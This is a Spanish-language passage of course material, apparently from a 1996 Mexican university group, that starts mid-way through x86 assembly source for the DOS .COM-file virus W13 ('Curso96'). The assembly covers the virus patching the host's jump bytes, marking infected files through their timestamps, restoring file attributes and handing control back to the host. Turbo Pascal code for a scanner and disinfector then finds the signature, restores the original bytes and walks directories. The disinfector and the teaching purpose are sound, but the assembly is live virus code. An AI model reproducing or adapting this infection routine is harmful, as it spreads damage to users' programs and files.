               MOV     CX,0              ;CX:DX Desplazamiento deseado
               MOV     DX,CX             ;0000:0000
               INT     21H

               JC      FINFEHO       	 ;Si hay error termina
               MOV     AH,40H        	 ;Servicio de escribir a archvio
               MOV     CX,3          	 ;Número de Bytes por escribir
               MOV     DX,DI             ;Pone DX  en la dir. del area de 
                                         ;datos
               ADD     DX,(OFFSET NEWDIR - OFFSET DATOS)   ;Pone DX en la Dir. 
					 ;donde esta el nuevo salto
               INT     21H
FINFEHO:
               MOV     CX,WORD PTR DS:[DI+ (OFFSET DATHORA - OFFSET DATOS)]
                                         ;Mueve la hora del archivo a CX
               MOV     DX,WORD PTR DS:[DI+(OFFSET DATFECHA - OFFSET DATOS)]
                                         ;Mueve  la fecha del archivo a DX
               AND     DX,0FE1FH    	 ;Pone los atributos en DX para
               OR      DX,1A0H     	 ;Saber que ya se infectó
               MOV     AX,5701H    	 ;Escribe fecha y hora al archivo
               INT     21H
               MOV     AH,3EH    	 ;Cerrar archivo
               INT     21H

RESTFIN:
               MOV     AX,4301H          ;Restaura atributos de archivo
               MOV     CX,WORD PTR DS:[DI+(OFFSET DATRIBUTO - OFFSET DATOS)]
                                         ;Pone en CX atributos originales
               INT     21H
TERMINA:
               MOV     DX,80H    	;Restaura la dirección del DTA
               MOV     AH,1AH         	;Por Default En DS:80h
               INT     21H
MENOR:
               POP     AX               ;Saca  AX de la pila
               MOV     DI,100H         	;Pone DI en el inicio
               PUSH    DI              	;Guarda un 100h en la pila
               DB      0C3H            	;(*RET) Regresa el control al 
                                        ;programa principal

DATOS:         NOP                    	;3
               NOP                      ;Bytes
               NOP                      ;Originales
NewDir:        DB      0E9H,0F3H,01H    ;Nueva dirección del Salto
DATRAIZ:       DB      '\'
COMFILE:       DB      ' .COM',0        ;Tipo de archivo a buscar

DATNAME:       DB      'TRAMPA.COM'     ;Area de datos para el archivo
                             DB      0, 0, 0,0
DATRIBUTO:     DB      20H, 0
DATHORA:       DB      9CH, 95H
DATFECHA:      DB      6FH, 17H
DATAMANO:      DB      0, 0,0,0

DTA:           DB      1,'        COM'  ;21 Bytes Reservados por MS-DOS
               DB      3, 3,0,57H, 0, 2EH, 8BH, 26H, 0C6H  ;En la DTA
ATRIBUTO:      DB      20H              ;Estructura de la DTA
HORA:          DB      9CH,95H
FECHA:         DB      6FH,17H
TAMANO:        DB      0F6H,1, 0, 0
NOMEXT:        DB      'TRAMPA.COM',0,4DH,0     ;Fin de la DTA

INT24:         MOV     AX,0
               IRET
               DB      'Curso96'
FINAL:
w13            ENDP
CODE_SEG_A     ENDS
               END     START

  {Esta unidad busca el virus W13 en los archivos con extensión COM la  forma 
 de "búsqueda" es interpretando el  desplazamiento del  salto, y  de  ahí  se
 desplaza  al lugar  donde  se  supone  estará la cadena; el inconveniente de 
 este  sistema  es  que  si tiene infección de algún otro virus, no lo  va  a
 detectar  porque trataría de localizar la cadena en  el  código  del  último
 virus que lo infecto.}

Unit curso;

interface

Uses Crt,Dos;

Procedure BuscaBeso(NomArch:String); { Ingresa un nombre de archivo}

implementation

Procedure BuscaBeso(NomArch:String); {Procedimiento de Búsqueda}
Const
     Codigo = 'Curso96';       {Código que va a buscar}
     Tam_Cad = 7;
Var
   Arch : File Of Byte;
   Cadena: String[Tam_Cad];
   Contenido,I :Byte;
   Op: Char;
   Atorig,Atarch,Salto: Word;
   Tam: LongInt;

 {Este procedimiento obtiene los 3 bytes originales del programa infectado
 que se encuentran en Salto+$16E y los pone en el inicio del archivo}

Procedure Limpia;
Var
   Original : Array [1..3] Of Byte;
   I:Byte;
Begin
     Seek (Arch,Salto+$16E);
     For I:=1 To 3 Do
         Begin
              Read (Arch,Original[I]);
              Original[I]:=Original[I]
         End;
     Seek (Arch,Salto);
     Truncate (Arch);
     Seek (Arch,0);
     For I:=1 To 3 Do
         Write (Arch,Original[I]);
     Writeln ('Virus Aniquilado.')
End;

Begin {BusVir}
     Atarch:= Archive;
     Cadena:='';
     Assign (Arch,NomArch);
     GetFAttr(Arch,Atorig);   {Obtenemos atributos para regresarlos después}
     SetFAttr (Arch,Atarch);  {Coloca atributos de archivo normal}
     {$I-}
     Reset (Arch);

     If IORESULT = 0 Then
        Begin
             Read (Arch,Contenido);
             Case Contenido Of
                  $EB: Begin                       {Salto corto}
                            Read (Arch,Contenido);
                            Salto:=Contenido + 2
                       End;
                  $E9: Begin                       {Salto largo}
 {Se interpreta el salto según lo  interpreta  el  procesador, es  decir,  el
 primer  byte   es   el   mnemónico  y  los  otros 2  bytes  son relativos al
 desplazamiento del salto}
                            Read (Arch,Contenido);
                            Salto:=Contenido + 3;
                            Read (Arch,Contenido);
                            Salto:=Salto + (Contenido*$100)
                       End;
             End;{Case}
             Tam:=FileSize (Arch);
             If (Salto+$1C9) < Tam Then
                                {Lugar donde se busca la cadena}
                Begin
                     Seek (Arch,Salto+$1C2);
                     For I:=1 To Tam_Cad Do
                         Begin
                              Read (Arch,Contenido);
                              Cadena:=Cadena+Chr(Contenido)
                         End;
                     If Cadena=Codigo Then  {Compara con cadena de búsqueda}
                        Begin
                             Writeln ('..........Archivo Infectado!!!');
                             Write ('Eliminar Virus (S/N) : ');
                             Repeat
                                  Op:=Readkey;
                             Until Upcase(Op) In ['N','S'];
                             Writeln (Upcase (OP));
                             If Upcase (Op) = 'S' Then Limpia
                        End
                        Else
                            Writeln ('..........Archivo No Infectado.')
                End
                Else
                    Writeln ('..........Archivo No Infectado.');
             Close (Arch)
        End;
     SetFAttr (Arch,Atorig);
     {$I+}
End;
End.



{ Proporcionada por R2000 }

unit BusCurso;

 { Rutina que Busca Archivos Especificados atraves de  una  unidad  de  disco
especificada por el usuario; al encontrar el archivo manda llamar una  rutina
que el usuario programara.}

interface

Uses Dos,Curso;

Procedure BuscadIR(Unidad:Byte;ArcABus:String);

{Parámetros de Entrada:
Unidad : Número de Unidad Donde se va a buscar.
ArcABus : Especificación de archivo que se buscar .
}

implementation
Procedure BuscaDir(Unidad:byte;ArcABus:String);
Const
    DirCual = $2f;
    SoloDir = $33;
Var
  DirAct,DirEnt,Nombre : String;
  DirInfo: SearchRec;
begin
{$I-}
  GetDir(Unidad,DirEnt);
  FindFirst(ArcABus, DirCual, DirInfo);
  while DosError = 0 do
    begin
         Write(DirEnt);
         If DirEnt[length(DirEnt)] <> '\' then
            Begin
                 Write('\');
                 Nombre:=DirEnt+'\'+DirInfo.Name+#0+#0
            End
         Else
             Nombre:=DirEnt+DirInfo.Name+#0+#0;
         Write(DirInfo.Name);
         BuscaBeso(DirInfo.Name);
         FindNext(DirInfo)
    end;
  FindFirst('*.*', SoloDir, DirInfo);
  while DosError = 0 do
     begin
       If (DirInfo.Attr = Directory) Then
         If (DirInfo.Name <> '.') Then
           If (DirInfo.Name <> '..') Then
             Begin
                  ChDir(DirInfo.Name);
                  BuscaDir(Unidad,ArcABus);
                  ChDir('..');
             End;
       FindNext(DirInfo);
     end;
     {$I+}
End;
end.




Program Vacunas(Parametro);
Uses Dos,Crt,BusCurso;
Var
  DirAct : String;
  Parametro : String;
  Unidad,NoParametro :Byte;
(*****************************************************************)
Begin   {Principal}
{$I-}
  ClrScr;
  Writeln ('                     (c)  Virus Curso96 1.0');
  Writeln ('                  Esta Vacuna Fue Realizada En ');
  Writeln ('           La Benemérita Universidad Autónoma De Puebla');
  Writeln ('           Grupo de Apoyo Universitario para Servicio de
Software');
  Writeln ('              Grupo de Investigación en Vida Artificial');
  Writeln ('                       Autor : R2000.');
  Writeln ('                     raiders@mexico.com');
  Writeln ('                    Puebla, México 1996.');
  Parametro:='';
  Parametro:=ParamStr (1);
  NoParametro:=ParamCount;
  Parametro[1]:=Upcase (Parametro[1]);
  If (NOT (Parametro[1] In ['A'..'Z'])) And (NoParametro < 1) Then
     Begin
          Writeln ('El Formato Es Vacuna Drive: ');
          Halt
     End
  Else
      Unidad := Ord(UpCase(Parametro[1])) -$40;
  GetDir(0,DirAct); { 0 = Drive actual }
  ChDir(Parametro+'\');
  BuscaDir(Unidad,'*.COM');
  ChDir(DirAct);
  {$I+}
End.

 #               ############################################               #  
 #              ##      ESTE TEXTO ES PROPIEDAD DE SUS      ##              #  
 #              #      RESPECTIVOS AUTORES. EL TEXTO ES      #              #  
 ################       LIBRE DISTRIBUCION, SIEMPRE Y        ################  
    #############         CUANDO SE NOMBRE EL AUTOR.         #############    
                ###                                         ###               
                 ##############################################               
                  ############################################                